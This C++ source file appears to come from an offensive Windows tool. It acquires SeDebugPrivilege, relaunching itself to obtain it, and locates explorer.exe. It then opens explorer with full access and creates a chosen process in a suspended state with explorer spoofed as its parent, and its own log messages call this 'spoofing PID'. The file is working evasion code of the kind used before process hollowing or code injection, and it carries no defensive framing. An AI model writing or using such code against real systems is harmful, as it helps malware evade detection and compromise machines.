#pragma once
#include <tchar.h>
#include <windows.h>
#include <tlhelp32.h>

#include "Ridgway.h"
#include "Restart.h"


BOOL GetDebugPrivilege()
{
	HANDLE currentTokenHandle;

	// Get a handle on the current process' token
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &currentTokenHandle))
	{
		// First check if debug priv is available
		DWORD informationLength;
		LUID privilegeLuid;

		// Get the LUID for the debug priv
		if (!LookupPrivilegeValue(nullptr, _T("SeDebugPrivilege"), &privilegeLuid)) {
			CloseHandle(currentTokenHandle);
			return FALSE;
		}

		// Get the size of the struct by passing NULL for the information to be written to
		GetTokenInformation(currentTokenHandle, TokenPrivileges, nullptr, 0, &informationLength);

		// Get enough memory based on the returned length 
		PTOKEN_PRIVILEGES processTokenPrivs = (PTOKEN_PRIVILEGES)malloc(informationLength);

		// Now we have the length, actually populate the information
		DWORD returnLength;
		if (!GetTokenInformation(currentTokenHandle, TokenPrivileges, processTokenPrivs, informationLength, &returnLength)) {
			CloseHandle(currentTokenHandle);
			return FALSE;
		}

		bool seDebugAvailable = false;
		// Iterate over the privs and check for the debug priv LUID
		for (DWORD x = 0; x < processTokenPrivs->PrivilegeCount; x++) {
			const PLUID_AND_ATTRIBUTES runner = &processTokenPrivs->Privileges[x];
			if ((runner->Luid.LowPart == privilegeLuid.LowPart) && (runner->Luid.HighPart == privilegeLuid.HighPart)) {
				DebugPrint(_T("[+] SeDebugPrivilege available!\n"));
				seDebugAvailable = true;
				break;
			}
		}

		if (!seDebugAvailable) {
			DebugPrint(_T("[-] SeDebugPrivilege unavailable\n[-] Please run with Privileges!\n"));
			CloseHandle(currentTokenHandle);
			RelaunchSelf();
			return FALSE;
		}

		TOKEN_PRIVILEGES newTokenPrivs;

		// Set the LUID of the new token to that of the DEBUG priv
		newTokenPrivs.Privileges[0].Luid = privilegeLuid;

		// Enable the priv and say we're only changing one priv
		newTokenPrivs.PrivilegeCount = 1;
		newTokenPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		// Set the change on our token
		if (!AdjustTokenPrivileges(currentTokenHandle, FALSE, &newTokenPrivs, sizeof(newTokenPrivs), nullptr, nullptr))
		{
			CloseHandle(currentTokenHandle);
			return FALSE;
		}
		CloseHandle(currentTokenHandle);
		return TRUE;
	}

	return FALSE;
}

HANDLE GetParentProcessHandle(int parentProcessId)
{
	DebugPrint(TEXT("[*] Getting handle on parent process: %d\n"), parentProcessId);
	auto parentProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, parentProcessId);
	// TODO check if process is for current user and if not ask for debug priv
	if (nullptr == parentProcessHandle)
	{
		DebugPrint(TEXT("[*] Could not get handle, trying to get debug privilege to retry...\n"));
		if (!GetDebugPrivilege())
		{
			DebugPrint(TEXT("[-] Unable to get debug privilege. \n"));
			return nullptr;
		}
		DebugPrint(TEXT("[*] Got debug privilege\n"));
		
		parentProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, parentProcessId);
		if(nullptr != parentProcessHandle)
		{
			DebugPrint(TEXT("[+] Opened process\n"));
		}
		else
		{
			DebugPrint(TEXT("[-] Failed to open process\n"));
		}
		
	}
	return parentProcessHandle;
}

PPROC_THREAD_ATTRIBUTE_LIST GetParentAttributeList(HANDLE &parentProcessHandle)
{
	DebugPrint(TEXT("[*] Getting attribute list from parent process\n"));
	SIZE_T attributeListSize = 0;
	// Pass null to get the size of the attribute list
	InitializeProcThreadAttributeList(nullptr, 1, 0, &attributeListSize);

	// Allocate space for it
	const auto parentAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeListSize);
	if (nullptr == parentAttributeList)
	{
		DisplayErrorMessage(TEXT("HeapAlloc error"), GetLastError());
		return nullptr;
	}
	// Create the attribute list
	if (!InitializeProcThreadAttributeList(parentAttributeList, 1, 0, &attributeListSize))
	{
		DisplayErrorMessage(TEXT("InitializeProcThreadAttributeList error"), GetLastError());
		return nullptr;
	}
	// Update it with the parent process attribute using the parent process handle
	if (!UpdateProcThreadAttribute(parentAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parentProcessHandle, sizeof(HANDLE), nullptr, nullptr))
	{
		DisplayErrorMessage(TEXT("UpdateProcThreadAttribute error"), GetLastError());
		return nullptr;
	}
	DebugPrint(TEXT("[+] Got attribute list\n"));
	return parentAttributeList;
}

int GetExplorerPid()
{
	DebugPrint(TEXT("[*] Getting explorer PID as process ID\n"));
	WCHAR targetProcessName[] = L"explorer.exe";

	auto* snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); 

	PROCESSENTRY32W entry;
	entry.dwSize = sizeof entry;

	if (!Process32FirstW(snap, &entry)) {
		DisplayErrorMessage(TEXT("Error retrieving process snapshots"), GetLastError());
		return 0;
	}

	do {
		if ((std::wcscmp(entry.szExeFile, targetProcessName) == 0)) {
			DebugPrint(TEXT("[+] Found parent PID: %d\n"), entry.th32ProcessID);
			return entry.th32ProcessID;
		}
	} while (Process32NextW(snap, &entry));
	DebugPrint(TEXT("[-] Parent process not found: %s\n"), targetProcessName);
	return 0;
}

PROCESS_INFORMATION StartProcessSuspended(_TCHAR* processName, int parentProcessId)
{
	auto processInfo = PROCESS_INFORMATION();
	if (parentProcessId == -1)
	{
		parentProcessId = GetExplorerPid();
	}

	// Get a handle on the parent process
	auto* parentProcessHandle = GetParentProcessHandle(parentProcessId);

	if (nullptr == parentProcessHandle)
	{
		DisplayErrorMessage(TEXT("Error getting handle on parent process"), GetLastError());
		return processInfo;
	}

	DebugPrint(TEXT("[+] Opened handle to parent process\n"));

	STARTUPINFOEX startupInfo = { sizeof(startupInfo) };

	// Get the attribute list from the parent process
	auto* const parentAttributeList = GetParentAttributeList(parentProcessHandle);

	if (parentAttributeList == nullptr)
	{
		DisplayErrorMessage(TEXT("Error getting attributes from parent process"), GetLastError());
		return processInfo;
	}
	DebugPrint(TEXT("[+] Got parent attributes list: 0x%0p\n"), parentAttributeList);


	// Set the startup info attribute list to the one set from the 'parent'.
	startupInfo.lpAttributeList = parentAttributeList;
	DebugPrint(TEXT("[*] Creating process %s spoofing PID of %d...\n"), processName, parentProcessId);
	// Create the process
	if (!CreateProcess(nullptr, processName, nullptr, nullptr, FALSE, EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED, nullptr, nullptr, &startupInfo.StartupInfo, &processInfo))
	{
		DisplayErrorMessage(TEXT("CreateProcess error"), GetLastError());
		return processInfo;
	}
	DebugPrint(TEXT("[+] Process created: %d\n"), processInfo.dwProcessId);

	// Cleanup
	DeleteProcThreadAttributeList(parentAttributeList);
	CloseHandle(parentProcessHandle);
	DebugPrint(TEXT("[+] Cleanup successful\n"));
	return processInfo;
}